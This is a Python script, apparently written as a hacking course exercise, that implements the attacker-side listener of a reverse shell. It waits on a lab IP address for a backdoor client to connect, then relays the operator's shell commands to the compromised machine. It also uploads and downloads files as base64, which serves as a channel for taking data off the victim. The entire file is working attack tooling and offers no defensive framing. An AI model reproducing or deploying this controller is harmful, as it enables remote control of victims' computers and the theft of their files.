import socket
import json
import base64

class Listner:

    def __init__(self,ip ,port):
        listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listner.bind((ip,port))
        listner.listen(0)
        print("[+]listening for incoming connection")
        self.connection, address = listner.accept()
        print("[+]Got connnection" + str(address))

    def relaiable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data)

    def relaiable_recv(self):
        json_data=b""
        while True:
            try:
                json_data=json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue


    def execute_command(self,command):
        self.relaiable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.relaiable_recv()

    def write_file(self,path ,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+]download successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            try:
                command =raw_input(">>")
                command =command.split(" ")
            except:
                command = input(">>")
                command = command.split(" ")

            try:
                if command[0] =="upload":
                    file_content=self.read_file(command[1])
                    command.append(file_content)

                result=self.execute_command(command)

                if command[0]== "download" and "[-]Error"not in result :
                    result= self.write_file(command[1], result)
            except Exception:
                result="[-]Error"

            print(result)




my_listner=Listner("192.168.56.104", 4567)
my_listner.run()
